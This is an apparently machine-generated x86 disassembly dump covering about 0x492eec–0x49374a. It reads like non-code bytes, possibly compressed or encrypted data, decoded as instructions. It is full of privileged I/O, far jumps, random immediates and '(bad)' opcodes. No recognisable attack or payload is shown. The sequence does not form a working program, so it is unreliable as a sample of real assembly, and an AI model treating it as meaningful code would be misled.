  492eec:	les    edi,FWORD PTR [ebx+0x5cc4d71d]
  492ef2:	mov    eax,0x8b532075
  492ef7:	pop    es
  492ef8:	js     0x492e87
  492efa:	das    
  492efb:	or     BYTE PTR [eax-0x5b],al
  492efe:	inc    esi
  492eff:	test   al,0x42
  492f01:	push   es
  492f02:	pop    eax
  492f03:	xchg   ebp,eax
  492f04:	xchg   edx,eax
  492f05:	mov    ebp,DWORD PTR [edx+0xa]
  492f08:	sbb    dh,al
  492f0a:	dec    eax
  492f0b:	aas    
  492f0c:	sub    DWORD PTR [eax+0x5c],eax
  492f0f:	sbb    cl,al
  492f11:	mov    BYTE PTR ds:[esi+0x2e425376],dl
  492f18:	push   es
  492f19:	add    dl,BYTE PTR [ecx]
  492f1b:	mov    bh,0xf1
  492f1d:	ror    BYTE PTR [esi],1
  492f1f:	add    eax,0xf9385b40
  492f24:	fstp   QWORD PTR [ebp+0x223258e4]
  492f2a:	aam    0xaf
  492f2c:	je     0x492fa9
  492f2e:	cmc    
  492f2f:	mov    edi,0x819119ac
  492f34:	data16 or al,0xff
  492f37:	out    dx,al
  492f38:	ins    BYTE PTR es:[edi],dx
  492f39:	data16 sbb ah,ah
  492f3c:	cwde   
  492f3d:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  492f3e:	push   esi
  492f3f:	inc    esp
  492f40:	add    DWORD PTR es:[ecx+0x2b],ebx
  492f44:	add    DWORD PTR [edi-0x5edb16cb],ecx
  492f4a:	inc    ebx
  492f4b:	hlt    
  492f4c:	mov    ds:0x502d2f14,al
  492f51:	clc    
  492f52:	pusha  
  492f53:	dec    esp
  492f54:	aam    0x27
  492f56:	lock xor ah,bl
  492f59:	in     al,dx
  492f5a:	push   eax
  492f5b:	repnz shl BYTE PTR [esi+0x3e],0x29
  492f60:	shl    BYTE PTR [esi],1
  492f62:	xchg   edx,eax
  492f63:	adc    edx,DWORD PTR [esi-0x14]
  492f66:	test   al,0x1c
  492f68:	add    al,0x23
  492f6a:	sub    al,0x3e
  492f6c:	or     eax,0xfbe839bb
  492f71:	sub    eax,0x50904dcd
  492f76:	in     al,0x46
  492f78:	stc    
  492f79:	imul   esi,esi,0x40
  492f7c:	xchg   BYTE PTR [ebx+0x22],bl
  492f7f:	inc    ebx
  492f80:	add    dh,BYTE PTR [eax+ecx*1]
  492f83:	push   0xa10deee3
  492f88:	push   edx
  492f89:	xor    al,0x22
  492f8b:	add    DWORD PTR [edi],ebx
  492f8d:	add    dh,BYTE PTR [ebp+0x6]
  492f90:	jne    0x49300d
  492f92:	shr    BYTE PTR [eax+eax*1],0xb4
  492f96:	mov    al,0x2b
  492f98:	inc    ebp
  492f99:	loopne 0x492f34
  492f9b:	xchg   ecx,eax
  492f9c:	jb     0x492f7e
  492f9e:	xor    al,0xd0
  492fa1:	jp     0x492f6e
  492fa3:	add    BYTE PTR [edx-0x17eff55a],bl
  492fa9:	adc    al,0x96
  492fab:	mov    esi,0xba84872e
  492fb0:	stos   DWORD PTR es:[edi],eax
  492fb1:	mov    eax,0xb59f1ebb
  492fb6:	test   al,0x9d
  492fb8:	into   
  492fb9:	adc    BYTE PTR ds:0x15b10a79,cl
  492fbf:	xchg   edi,eax
  492fc0:	out    0xf2,eax
  492fc2:	mov    esp,0x65181242
  492fc7:	sbb    al,0x9e
  492fc9:	and    BYTE PTR [ebp+0x73ef2ef],dl
  492fcf:	adc    eax,0x44282458
  492fd4:	xor    ebx,DWORD PTR [esi]
  492fd6:	sub    al,0x4f
  492fd8:	in     eax,0xbb
  492fda:	cmp    al,0x23
  492fdc:	xor    BYTE PTR [edx],dl
  492fde:	test   DWORD PTR [esp+esi*1],edx
  492fe1:	adc    ecx,esp
  492fe3:	xor    BYTE PTR [eax],dl
  492fe5:	cmp    BYTE PTR [ecx-0x6f],ch
  492fe8:	mov    ebp,DWORD PTR [eax+edi*8+0xa]
  492fec:	jmp    0xe4bba74
  492ff1:	fcmovu st,st(3)
  492ff3:	loop   0x493037
  492ff5:	cmp    ecx,DWORD PTR ds:0x3bad9b86
  492ffb:	xor    eax,0x22f30275
  493000:	add    cl,BYTE PTR [edi]
  493002:	add    ah,BYTE PTR [ecx-0x66]
  493005:	and    edx,DWORD PTR [eax]
  493007:	jmp    0x2484:0xe42037c
  49300e:	ins    DWORD PTR es:[edi],dx
  49300f:	daa    
  493010:	mov    eax,ds:0x881058d6
  493015:	inc    edi
  493016:	imul   ecx,DWORD PTR ds:0xcfecd0d,0xffffffa8
  49301d:	pop    eax
  49301e:	mov    WORD PTR [esi],fs
  493020:	pushf  
  493021:	or     dh,BYTE PTR [esp+eax*1+0x4d34d34d]
  493028:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  493029:	xchg   esp,eax
  49302a:	mov    al,ds:0xd290b098
  49302f:	or     DWORD PTR [edx],ebp
  493031:	loopne 0x49306c
  493033:	dec    ebp
  493034:	and    al,0x67
  493036:	cdq    
  493037:	adc    eax,DWORD PTR [ebp+0x5f]
  49303a:	sbb    BYTE PTR [esi+ebp*1-0x53aa0b08],dl
  493041:	pop    esi
  493042:	mov    BYTE PTR [edx],al
  493044:	push   0xffffffea
  493046:	or     eax,0x78961001
  49304b:	add    BYTE PTR [esi+0xac60980],bl
  493051:	inc    edx
  493052:	or     eax,0xefeec9b8
  493057:	mov    eax,0xe5ebd603
  49305c:	push   0x30
  49305e:	pop    ebx
  49305f:	cmp    dl,BYTE PTR [edx]
  493061:	or     ecx,DWORD PTR ds:[edi]
  493064:	xchg   DWORD PTR [eax+ebx*1-0x5b253786],esi
  49306b:	daa    
  49306c:	test   eax,0x27693610
  493071:	nop
  493072:	dec    eax
  493073:	iret   
  493074:	or     BYTE PTR ss:[edi+0x6a],dh
  493078:	sbb    esi,DWORD PTR [esi+0x2b5990ed]
  49307e:	dec    esi
  49307f:	fisttp DWORD PTR [ebx-0x4568df2e]
  493085:	lods   eax,DWORD PTR ds:[esi]
  493086:	mov    DWORD PTR [ecx-0x41f0f134],ecx
  49308c:	or     DWORD PTR [esi+0x6a],ebp
  49308f:	shr    DWORD PTR ds:0x5905ebbd,1
  493095:	jmp    0x49303d
  493097:	call   0xcc65a4c7
  49309c:	or     eax,0x2d16e86c
  4930a1:	pop    ebp
  4930a2:	mov    esp,0xacebcf17
  4930a7:	mov    bh,0xd9
  4930a9:	lahf   
  4930aa:	jno    0x49309c
  4930ac:	mov    WORD PTR [ebx+ebp*8-0x5f],es
  4930b0:	and    DWORD PTR [ebp+0x10],0x1c
  4930b4:	jmp    0x49304f
  4930b6:	mov    ds:0x576d5d2,al
  4930bb:	mov    WORD PTR [ecx+ebp*4+0x49bab76],fs
  4930c2:	loop   0x49309a
  4930c4:	add    al,0xd5
  4930c6:	call   0x2d08:0x26982cb0
  4930cd:	je     0x4930f0
  4930cf:	in     eax,dx
  4930d0:	lea    esi,[edi+0x10b7446a]
  4930d6:	inc    ebx
  4930d7:	jle    0x7e8e4a47
  4930dd:	mov    al,ds:0xb04cd5c0
  4930e2:	pushf  
  4930e3:	add    BYTE PTR [esi+0x5a],0xb0
  4930e7:	inc    eax
  4930e8:	or     BYTE PTR [edi],0x56
  4930eb:	push   es
  4930ec:	sub    BYTE PTR [eax],ch
  4930ee:	push   0xb
  4930f0:	add    esi,DWORD PTR [ebp+ebp*1+0x78]
  4930f4:	into   
  4930f5:	xchg   edx,eax
  4930f6:	fcom   DWORD PTR [ebx+0x44]
  4930f9:	push   edx
  4930fa:	xor    al,0x13
  4930fc:	pop    ecx
  4930fd:	inc    eax
  4930fe:	push   0xffffffb1
  493100:	dec    esp
  493101:	cs sbb esp,ebx
  493104:	xor    eax,0x3f641089
  493109:	sbb    al,ch
  49310b:	lea    edi,[edx-0x10]
  49310e:	push   0xeb12d294
  493113:	and    edi,DWORD PTR [ecx+edi*1]
  493116:	ja     0x49313a
  493118:	dec    esp
  493119:	fdivr  st,st(6)
  49311b:	push   cs
  49311c:	popa   
  49311d:	mov    ah,0x19
  49311f:	add    BYTE PTR [ebp-0x58],cl
  493122:	inc    DWORD PTR [ebp-0x4c]
  493125:	sub    al,bl
  493127:	or     BYTE PTR [eax+0x4e687d88],ch
  49312d:	add    esi,ebx
  49312f:	or     al,0xb0
  493131:	sub    eax,0x85ae9c66
  493136:	mov    dh,0x70
  493138:	jae    0x493112
  49313a:	test   eax,0x4bafc032
  49313f:	sub    DWORD PTR [ebp+0x10601b4b],ecx
  493145:	jno    0x493174
  493147:	mov    edx,0x2fee8e6f
  49314c:	push   ebp
  49314d:	xchg   ebx,eax
  49314e:	cmps   BYTE PTR ss:[esi],BYTE PTR es:[edi]
  493150:	xchg   esp,eax
  493151:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  493152:	xchg   esp,eax
  493153:	jne    0x493187
  493155:	jmp    0x49314e
  493157:	arpl   WORD PTR [edx+0x3],cx
  49315a:	adc    al,0x99
  49315c:	je     0x493151
  49315e:	jmp    0x493181
  493160:	in     eax,dx
  493161:	fnstcw WORD PTR [ebp+0x1020cbbb]
  493167:	out    0xf2,al
  493169:	in     eax,dx
  49316a:	dec    edx
  49316b:	bnd jbe 0x493165
  49316e:	loope  0x4930fe
  493170:	jmp    0xc0bffa4f
  493175:	rol    BYTE PTR [esi+0x3701e660],1
  49317b:	xor    ah,bl
  49317d:	xchg   DWORD PTR [ecx-0x48],eax
  493180:	inc    esi
  493181:	in     eax,0xbd
  493183:	lea    ecx,[edx+0x2d]
  493186:	ficom  WORD PTR [esp+edx*1-0x7e]
  49318a:	lods   al,BYTE PTR ds:[esi]
  49318b:	inc    ebp
  49318c:	or     DWORD PTR [ebx],ebp
  49318e:	adc    esp,DWORD PTR [eax]
  493190:	std    
  493191:	mov    eax,ds:0x12103cbb
  493196:	pop    ebp
  493197:	or     BYTE PTR [ebx-0x7d],al
  49319a:	dec    ebp
  49319b:	pushf  
  49319c:	shr    ebp,0x59
  49319f:	mov    bh,0x14
  4931a1:	pop    es
  4931a2:	pop    ecx
  4931a3:	pop    ss
  4931a4:	popf   
  4931a5:	push   cs
  4931a6:	and    eax,0x5eba0aa
  4931ab:	sub    DWORD PTR [esi],ebp
  4931ad:	sub    bl,BYTE PTR [esi-0x6b3109e3]
  4931b3:	clc    
  4931b4:	xor    BYTE PTR [ebp+0x29ae25d4],dh
  4931ba:	cli    
  4931bb:	fisubr WORD PTR [edi-0x14cb578a]
  4931c1:	mov    dh,0x8a
  4931c3:	and    BYTE PTR ds:0xef4310b6,bh
  4931c9:	shr    eax,cl
  4931cb:	(bad)  
  4931cc:	je     0x49318c
  4931ce:	ret    0xa8ae
  4931d1:	add    DWORD PTR [eax],0xfffffff8
  4931d4:	and    al,0xba
  4931d6:	call   0x5b37bb63
  4931db:	cld    
  4931dc:	mov    edi,0x18220be0
  4931e1:	pop    eax
  4931e2:	cmp    DWORD PTR [esi+esi*2-0x8827f8d],edx
  4931e9:	add    eax,0x45fe037c
  4931ee:	test   DWORD PTR [ecx+0x18287d25],0x8e48a6b0
  4931f8:	jmp    0x49325b
  4931fa:	mov    al,ds:0x464c8097
  4931ff:	scas   al,BYTE PTR es:[edi]
  493200:	retf   0x9185
  493203:	(bad)  
  493204:	mov    al,0xe8
  493206:	push   ds
  493207:	cs (bad) 
  493209:	clc    
  49320a:	shr    bl,1
  49320c:	sbb    eax,0xc96b230f
  493211:	or     al,0xdb
  493213:	jg     0x4931b8
  493215:	sahf   
  493216:	clc    
  493217:	lea    ecx,[ecx+edi*1-0x30]
  49321b:	cmp    ecx,0x7f921450
  493221:	or     al,0x7
  493223:	mov    ds:0xde7014ab,eax
  493228:	push   ds
  493229:	push   ecx
  49322a:	and    al,0xdc
  49322c:	cmp    BYTE PTR [esi+0x1a],dh
  49322f:	fsub   st(3),st
  493231:	cvtdq2ps xmm1,XMMWORD PTR [eax]
  493234:	pop    esp
  493235:	aas    
  493236:	in     al,dx
  493237:	imul   eax,DWORD PTR [ebp-0x566a4a3d],0x8afeddcc
  493241:	add    esp,DWORD PTR [edx+0x7c]
  493244:	or     eax,0xb48c6c6b
  493249:	call   0xd46db296
  49324e:	lods   eax,DWORD PTR ds:[esi]
  49324f:	inc    cx
  493251:	in     al,0xc4
  493253:	loopne 0x493209
  493255:	inc    eax
  493256:	add    eax,esi
  493258:	mov    cl,0x8d
  49325a:	add    dl,BYTE PTR [eax]
  49325c:	ss cwde 
  49325e:	(bad)  
  49325f:	mov    ds:0x82c400c1,ax
  493265:	pushf  
  493266:	jge    0x49329c
  493268:	in     eax,dx
  493269:	push   bp
  49326b:	sahf   
  49326c:	add    ecx,DWORD PTR [esi+0x12]
  49326f:	mov    al,ds:0x180e0375
  493274:	xchg   esp,eax
  493275:	sahf   
  493276:	ins    DWORD PTR es:[edi],dx
  493277:	mov    al,0xcb
  493279:	sbb    BYTE PTR [edi*1+0x218f9404],0x3d
  493281:	add    DWORD PTR [edi-0x6b8df699],edi
  493287:	sub    eax,0x1130b914
  49328c:	add    BYTE PTR [ebp-0x16414bfe],ah
  493292:	pusha  
  493293:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  493294:	fldln2 
  493296:	push   0x2e834bc
  49329b:	pushf  
  49329c:	jle    0x493257
  49329e:	nop
  49329f:	adc    ch,BYTE PTR [eax*1+0x26dc0c2e]
  4932a6:	xor    ch,BYTE PTR [esi+0x6]
  4932a9:	loopne 0x493270
  4932ab:	xchg   ecx,eax
  4932ac:	pop    edx
  4932ad:	mov    bl,0xe2
  4932af:	adc    al,0xac
  4932b1:	inc    esp
  4932b2:	lds    eax,FWORD PTR [eax]
  4932b4:	add    eax,0x9bfc20b4
  4932b9:	inc    eax
  4932ba:	mov    BYTE PTR [esi-0x53823e54],bh
  4932c0:	cmp    bl,BYTE PTR [ebx+0x5]
  4932c3:	sbb    BYTE PTR [edx+0x36],ch
  4932c6:	pop    es
  4932c7:	mov    DWORD PTR [edx],esp
  4932c9:	sbb    DWORD PTR [edi+ebx*8+0x6b7fc083],0xffffffc0
  4932d1:	or     al,0x8d
  4932d3:	sbb    al,0x1
  4932d5:	daa    
  4932d6:	cmp    WORD PTR [ebx],ax
  4932d9:	jb     0x4932e9
  4932db:	sub    edi,DWORD PTR [edx-0x7f]
  4932de:	std    
  4932df:	mov    esi,ebx
  4932e1:	lea    edi,[ebp-0x48]
  4932e4:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4932e5:	add    BYTE PTR [eax-0x47a27246],al
  4932eb:	push   eax
  4932ec:	into   
  4932ed:	pushf  
  4932ee:	pusha  
  4932ef:	xchg   edi,eax
  4932f0:	or     al,0x2b
  4932f2:	stc    
  4932f3:	or     DWORD PTR [ebx+0x6f],0x43eab4a4
  4932fa:	or     ah,BYTE PTR [ebp+esi*2-0x32]
  4932fe:	mov    ecx,0xdd7782ff
  493303:	pop    ds
  493304:	jb     0x4932d7
  493306:	and    eax,ecx
  493308:	and    esi,0x8d1dbf77
  49330e:	or     al,0x10
  493310:	mov    esi,ecx
  493312:	inc    ebx
  493313:	and    eax,0x562e5882
  493318:	retf   0xa7ee
  49331b:	imul   esp,DWORD PTR [ebx+0x5e],0xbf17c710
  493322:	std    
  493323:	mov    edi,0xf2bba01b
  493328:	repz iret 
  49332a:	ja     0x4008f139
  493330:	into   
  493331:	ja     0x493340
  493333:	mov    ebx,0xfb7f51c8
  493338:	ret    
  493339:	pop    esp
  49333a:	xchg   BYTE PTR [eax+0x26f633ad],bl
  493340:	(bad)  
  493341:	jne    0x493362
  493343:	inc    ecx
  493344:	test   DWORD PTR [ebp-0x34],0xfe17783d
  49334b:	adc    BYTE PTR [ebp+0x15],dh
  49334e:	cmp    DWORD PTR [ebp-0x38],esi
  493351:	out    0x75,al
  493353:	les    esi,FWORD PTR [ebp+0xb]
  493356:	test   eax,0xe6cbf4ce
  49335b:	(bad)  
  49335c:	dec    ebx
  49335d:	mov    al,0x46
  49335f:	(bad)  
  493360:	jne    0x493383
  493362:	inc    ebx
  493363:	or     BYTE PTR [edi],dl
  493365:	cmp    DWORD PTR [ebx+0x4],esi
  493368:	call   0xe22:0x9ab502b5
  49336f:	hlt    
  493370:	int3   
  493371:	add    al,0x96
  493373:	jne    0x49333f
  493375:	or     BYTE PTR [eax-0x63f14fa3],ch
  49337b:	hlt    
  49337c:	mov    bl,0xa0
  49337e:	add    DWORD PTR [ebp+0x5705a4fc],esi
  493384:	pushf  
  493385:	xchg   edx,eax
  493386:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  493387:	add    esp,DWORD PTR [ecx+0x42]
  49338a:	add    al,0x68
  49338c:	push   ebp
  49338d:	cwde   
  49338e:	hlt    
  49338f:	call   0xc405:0x5adb6cd6
  493396:	call   0x36a0:0xa848d94
  49339d:	xchg   esp,eax
  49339e:	mov    al,ds:0xa0250f0
  4933a3:	push   0xb0654e12
  4933a8:	fwait
  4933a9:	or     al,ah
  4933ab:	fucomip st,st(4)
  4933ad:	scas   eax,DWORD PTR es:[edi]
  4933ae:	ret    0x578b
  4933b1:	cld    
  4933b2:	lea    esi,[edx+eax*1]
  4933b5:	enter  0x3b04,0x1e
  4933b9:	xor    al,0x1c
  4933bb:	(bad)  
  4933bc:	lock jae 0x4933cb
  4933bf:	and    cl,BYTE PTR [esp+eax*4]
  4933c2:	jle    0x493397
  4933c4:	ss jge 0x493350
  4933c7:	ja     0x4933c5
  4933c9:	je     0x4933ce
  4933cb:	inc    ax
  4933cd:	sub    esp,DWORD PTR [eax-0x6b993fea]
  4933d3:	ins    DWORD PTR es:[edi],dx
  4933d4:	mov    al,ds:0xcd2c9894
  4933d9:	ficom  WORD PTR [edi+eax*2-0x68]
  4933dd:	pop    eax
  4933de:	mov    ebx,0xa41cc68a
  4933e3:	test   bl,cl
  4933e5:	clc    
  4933e6:	inc    esi
  4933e7:	and    DWORD PTR [edi-0x70],edi
  4933ea:	add    ecx,0xfd417802
  4933f0:	fwait
  4933f1:	and    al,0x78
  4933f3:	scas   al,BYTE PTR es:[edi]
  4933f4:	jge    0x4933d2
  4933f6:	test   edi,edi
  4933f8:	js     0x493425
  4933fa:	mov    esi,DWORD PTR [ebp-0x6]
  4933fd:	das    
  4933fe:	adc    al,0x5e
  493400:	loopne 0x4933d6
  493402:	shl    DWORD PTR [ebp-0x2c],1
  493405:	pop    edx
  493406:	mov    edx,esi
  493408:	add    esi,esi
  49340a:	or     esi,eax
  49340c:	shr    edx,0x1f
  49340f:	and    eax,eax
  493411:	push   esi
  493412:	add    BYTE PTR [edx],cl
  493414:	or     eax,edx
  493416:	push   esi
  493417:	add    ch,BYTE PTR [ebx+edi*8-0x44a3fbe4]
  49341e:	bound  edi,QWORD PTR [edi-0x32]
  493421:	or     DWORD PTR [ebp+0x2b],ecx
  493424:	push   es
  493425:	dec    esi
  493426:	add    bh,BYTE PTR [esi-0x7fbd86ec]
  49342c:	ror    dl,0xda
  49342f:	aad    0xc6
  493431:	add    ecx,esi
  493433:	test   BYTE PTR [eax+0x7d46fc01],0xff
  49343a:	outs   dx,DWORD PTR ds:[esi]
  49343b:	out    0xcc,al
  49343d:	lods   al,BYTE PTR ds:[esi]
  49343e:	sahf   
  49343f:	push   ebp
  493440:	fcom   st(1)
  493442:	ins    DWORD PTR es:[edi],dx
  493443:	fadd   st(1),st
  493445:	loopne 0x493466
  493447:	shr    edi,1
  493449:	or     edi,eax
  49344b:	mov    eax,0x70bce2c1
  493450:	or     ebp,DWORD PTR [ebp+0x4e9ee812]
  493456:	or     bl,BYTE PTR [ebp+esi*2-0x2f]
  49345a:	xor    al,0x19
  49345c:	or     DWORD PTR [esi+ebp*2],esi
  49345f:	test   al,0x98
  493461:	jmp    0xbb50:0xb6dd03d4
  493468:	sub    BYTE PTR [edi+0x11],dh
  49346b:	push   0xa4e281d4
  493470:	push   eax
  493471:	push   esp
  493472:	mov    al,0xd9
  493474:	cmp    edx,0x34750a28
  49347a:	pusha  
  49347b:	(bad)  
  49347c:	sub    edi,DWORD PTR ss:[ebx-0xfaf8af9]
  493483:	(bad)  
  493484:	rcr    dl,0x93
  493487:	fiadd  DWORD PTR [eax]
  493489:	mov    edx,0x70fe09f7
  49348e:	mov    DWORD PTR [edx-0x15f88a22],0xeeb41de
  493498:	out    0x16,al
  49349a:	sbb    esp,eax
  49349c:	xchg   edi,eax
  49349d:	or     al,0x82
  49349f:	inc    ebp
  4934a0:	fisub  DWORD PTR [edi]
  4934a2:	(bad)  
  4934a3:	mov    eax,0x982e4ed8
  4934a8:	das    
  4934a9:	jl     0x493473
  4934ab:	jb     0x4934d0
  4934ad:	call   0x882f:0x8be04fe4
  4934b4:	sete   cl
  4934b7:	mov    cs,WORD PTR [ecx-0x7f]
  4934ba:	loope  0x4934ca
  4934bc:	rdmsr  
  4934be:	int3   
  4934bf:	add    al,0x7c
  4934c1:	push   es
  4934c2:	dec    eax
  4934c3:	aam    0x3b
  4934c5:	cmp    eax,0x66da991a
  4934ca:	mov    esp,DWORD PTR [eax+0xb]
  4934cd:	sbb    ah,BYTE PTR [edi]
  4934cf:	mov    eax,DWORD PTR [ebp+0x1ab0eec6]
  4934d5:	dec    ebx
  4934d6:	(bad)  
  4934d8:	call   0x5c6820ab
  4934dd:	in     eax,0x6f
  4934df:	das    
  4934e0:	lods   al,BYTE PTR ds:[esi]
  4934e1:	test   esi,esi
  4934e3:	jb     0x4934a5
  4934e5:	and    DWORD PTR [ebp-0x38],0x0
  4934e9:	dec    eax
  4934ea:	and    eax,0x50147105
  4934ef:	jo     0x4934c5
  4934f1:	sbb    al,0xc4
  4934f3:	mov    ds:0x11ac22cc,al
  4934f8:	mov    al,0x91
  4934fa:	push   es
  4934fb:	dec    esp
  4934fc:	push   es
  4934fd:	sbb    BYTE PTR [esi],dh
  4934ff:	add    ebx,eax
  493501:	call   0xca55:0x7a758060
  493508:	out    dx,al
  493509:	jmp    0x49353a
  49350b:	out    dx,al
  49350c:	sar    DWORD PTR [ebx],0x2b
  49350f:	sub    dl,BYTE PTR [eax+0x1df68404]
  493515:	mov    edx,0xf2af3b79
  49351a:	add    al,0x18
  49351c:	sub    al,0x2
  49351e:	movups xmm0,XMMWORD PTR [ecx]
  493521:	and    ch,BYTE PTR [eax-0x7d]
  493524:	sub    eax,0x5e46d201
  493529:	test   BYTE PTR [ebx],cl
  49352b:	call   0x277:0xa6495da8
  493532:	pop    esi
  493533:	lock inc edi
  493535:	cmp    BYTE PTR [eax],0x66
  493538:	jle    0x493592
  49353a:	xlat   BYTE PTR ds:[ebx]
  49353b:	xor    al,BYTE PTR [esi-0x77a04efa]
  493541:	pop    edi
  493542:	rcl    BYTE PTR ds:0xa2b64429,cl
  493548:	out    0x79,eax
  49354a:	pop    edx
  49354b:	and    ebx,DWORD PTR [ebx+eiz*4-0xb6a9ffa]
  493552:	out    0xf3,al
  493554:	cmp    al,0xcd
  493556:	cmp    al,0xa4
  493558:	push   ebx
  493559:	mov    cl,0x95
  49355b:	adc    ah,BYTE PTR [ebp-0x611dc39c]
  493561:	pop    es
  493562:	mov    edi,0x7e08116
  493567:	call   0x4ef4:0x32a6e142
  49356e:	pop    esp
  49356f:	daa    
  493570:	adc    esi,edi
  493572:	fs push ds
  493574:	rcl    DWORD PTR [edi+0x39],0x10
  493578:	and    al,al
  49357a:	ror    BYTE PTR [eax],1
  49357c:	or     eax,0xca144454
  493581:	out    dx,eax
  493582:	add    ah,BYTE PTR [bp+si+0x2ecf]
  493587:	adc    eax,ecx
  493589:	mov    ds:0xa46d124b,ax
  49358f:	out    dx,eax
  493590:	push   eax
  493591:	or     BYTE PTR [eax],ch
  493593:	or     ecx,DWORD PTR [ebx-0x65446077]
  493599:	cdq    
  49359a:	cmp    edx,0x5
  49359d:	out    0x60,al
  49359f:	or     BYTE PTR [edi-0x3b491ea],bl
  4935a5:	and    DWORD PTR [ecx],eax
  4935a7:	add    esp,eax
  4935a9:	pop    edx
  4935aa:	cmc    
  4935ab:	adc    BYTE PTR [ebx+ecx*4+0x604efa5e],cl
  4935b2:	jmp    0x85d4:0x7e80bff
  4935b9:	mov    dh,0x30
  4935bb:	and    al,0x59
  4935bd:	mov    edi,DWORD PTR [esi+0x5c]
  4935c0:	and    DWORD PTR [ecx+edi*1-0x24],0x9
  4935c5:	push   eax
  4935c6:	bound  esi,QWORD PTR gs:[esi+0x7cbf780c]
  4935cd:	in     eax,dx
  4935ce:	mov    esi,edx
  4935d0:	aaa    
  4935d1:	pop    esp
  4935d2:	fs xor al,0x64
  4935d5:	cmp    eax,0x75c0248e
  4935da:	or     edi,eax
  4935dc:	inc    esi
  4935dd:	add    DWORD PTR fs:[ecx-0x52],0xc
  4935e2:	mov    ebx,0x1f903d7e
  4935e7:	sub    DWORD PTR [esi+0x3d],0xc832b991
  4935ee:	xchg   ebp,eax
  4935ef:	test   BYTE PTR [esi+0x3d],bl
  4935f2:	xchg   ebx,eax
  4935f3:	test   DWORD PTR [esi+0x3d],ecx
  4935f6:	(bad)  
  4935f7:	retf   0x5720
  4935fa:	push   es
  4935fb:	cmp    BYTE PTR [esi],0x3d
  4935fe:	pop    DWORD PTR [esi-0x1be6a1b2]
  493604:	cs cmp eax,0x3d1e8a92
  49360a:	mov    ch,0x2
  49360c:	lea    esp,[ebx+0x70]
  49360f:	sub    dl,BYTE PTR [edi+0xe]
  493612:	cmp    eax,0x401007b4
  493617:	pop    ss
  493618:	test   BYTE PTR [edx-0x16],al
  49361b:	fs mov dl,0xd2
  49361e:	shl    BYTE PTR ds:0x645cc0b8,0xeb
  493625:	pop    es
  493626:	rcl    DWORD PTR [ecx+0x19],0x51
  49362a:	loop   0x493635
  49362c:	test   al,0x9e
  49362e:	pop    ebx
  49362f:	shl    BYTE PTR [ebp+0xe],0xaa
  493633:	xchg   ecx,eax
  493634:	les    ecx,FWORD PTR [esi+ebx*1-0x4c]
  493638:	xchg   ebx,eax
  493639:	inc    edx
  49363a:	and    al,BYTE PTR [eax]
  49363c:	jg     0x4936a8
  49363e:	inc    eax
  49363f:	push   0x20
  493641:	pop    esi
  493642:	push   esi
  493643:	mov    ebp,0x1f810feb
  493648:	push   0x75
  49364a:	or     BYTE PTR [ecx],dh
  49364c:	pushf  
  49364d:	fimul  DWORD PTR [ebp+0x1adb890]
  493653:	pop    esp
  493654:	fisub  DWORD PTR [ebx+0xa103521]
  49365a:	inc    ebp
  49365b:	inc    DWORD PTR [esi+0x36739e05]
  493661:	aam    0x5
  493663:	or     DWORD PTR [eax-0x5],0xffffffff
  493667:	mov    WORD PTR [eax+0x7e],0xdc0a
  49366d:	jg     0x4936a6
  49366f:	out    dx,eax
  493670:	mov    DWORD PTR [eax+0x3],ecx
  493673:	adc    BYTE PTR [edi],bl
  493675:	mov    BYTE PTR [eax+0x21],0x18
  493679:	xor    ecx,DWORD PTR [eax+0x358b2f48]
  49367f:	pop    edi
  493680:	add    al,dl
  493682:	jge    0x4936b5
  493684:	xchg   BYTE PTR [ebp-0x397e04b0],cl
  49368a:	cmp    DWORD PTR [eax+0x61],0xcde8b424
  493691:	push   ebx
  493692:	push   edi
  493693:	or     BYTE PTR [ebp-0x1a],0x90
  493697:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  493698:	xchg   esp,eax
  493699:	sub    ax,0xe881
  49369d:	retf   0x314
  4936a0:	jmp    0xc2eabb63
  4936a5:	js     0x4936aa
  4936a7:	ret    
  4936a8:	mov    esi,0xf1baef52
  4936ad:	or     ebx,esi
  4936af:	cmp    ebx,esi
  4936b1:	jl     0x4936b5
  4936b3:	push   cs
  4936b4:	sbb    eax,0xbf6b7ddd
  4936b9:	and    al,0xbe
  4936bb:	pop    eax
  4936bc:	pusha  
  4936bd:	jo     0x4936cb
  4936bf:	inc    ebx
  4936c0:	aas    
  4936c1:	xchg   esp,eax
  4936c2:	push   ecx
  4936c3:	add    DWORD PTR ds:0xeef8b82c,0x37
  4936ca:	and    BYTE PTR [ebp-0x31f89c78],cl
  4936d0:	xor    DWORD PTR [edi],esp
  4936d2:	adc    ch,BYTE PTR [edi+edx*1+0x15]
  4936d6:	loopne 0x4936db
  4936d8:	cmp    al,0x60
  4936da:	pop    ds
  4936db:	or     BYTE PTR [esi],0x33
  4936de:	add    BYTE PTR [edi],bh
  4936e0:	aad    0xa0
  4936e2:	cmp    eax,0xa20380f
  4936e7:	das    
  4936e8:	ror    BYTE PTR [edi],cl
  4936ea:	and    al,0xbc
  4936ec:	pushf  
  4936ed:	cmp    ebp,esi
  4936ef:	add    ebp,DWORD PTR [eax]
  4936f1:	cmp    edx,ecx
  4936f3:	jb     0x4936c7
  4936f5:	sub    ch,al
  4936f7:	jl     0x49369b
  4936f9:	jo     0x4936a0
  4936fb:	iret   
  4936fc:	dec    esp
  4936fd:	mov    WORD PTR [ebx],ss
  4936ff:	xor    esp,DWORD PTR [edx-0x73c2b78e]
  493705:	and    DWORD PTR [eax-0x7944a303],0x57765d1e
  49370f:	jb     0x49369b
  493711:	or     esp,ebx
  493713:	dec    ebp
  493714:	or     BYTE PTR [ecx+ebp*2+0x0],bh
  493718:	jno    0x493722
  49371a:	jne    0x493727
  49371c:	ficom  WORD PTR [ebp+edi*1+0x22f78b]
  493723:	or     eax,DWORD PTR [edx+ebx*2]
  493726:	mov    eax,edi
  493728:	fcom   DWORD PTR ds:0xe0026f80
  49372e:	xor    al,0xb1
  493730:	ret    0x10ce
  493733:	fdivr  QWORD PTR [ecx-0x34]
  493736:	push   0x28d125a9
  49373b:	push   cs
  49373c:	add    al,0x25
  49373e:	(bad)  
  49373f:	ror    DWORD PTR [edx-0x3e],0x4
  493743:	in     al,dx
  493744:	sub    esp,esi
  493746:	fst    st(4)
  493748:	xchg   esi,eax
  493749:	inc    ebp
  49374a:	mov    esp,0x4508c47
